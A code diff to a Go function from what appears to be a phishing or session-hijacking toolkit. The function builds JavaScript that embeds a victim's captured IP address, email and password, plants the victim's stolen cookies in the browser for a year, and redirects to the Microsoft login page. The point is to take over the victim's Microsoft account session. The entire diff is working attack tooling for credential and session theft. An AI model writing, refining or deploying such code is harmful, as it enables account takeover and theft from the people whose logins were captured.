@@ -212,13 +212,20 @@ func generateInjectionJS(s Session) string {
 
 	jsonCookies, _ := json.Marshal(cookies)
 
-	return fmt.Sprintf(`let ipaddress = "%s";
+	js := fmt.Sprintf(`let ipaddress = "%s";
 let email = "%s";
 let password = "%s";
 !function(){
 let e = %s;
-for(let o of e)
-document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?(o.path?"":"path=/")+";":""}Secure;SameSite=None\`;
-window.location.href="https://login.microsoftonline.com"
-}();`, s.RemoteAddr, s.Username, s.Password, string(jsonCookies))
+for(let o of e){
+document.cookie = o.name + "=" + o.value + ";Max-Age=31536000;" +
+    (o.path ? "path=" + o.path + ";" : "") +
+    (!o.path && o.domain ? "path=/;" : "") +
+    "Secure;SameSite=None";
 }
+window.location.href="https://login.microsoftonline.com";
+}();`, s.RemoteAddr, s.Username, s.Password, string(jsonCookies))
+
+	return js
+}
+
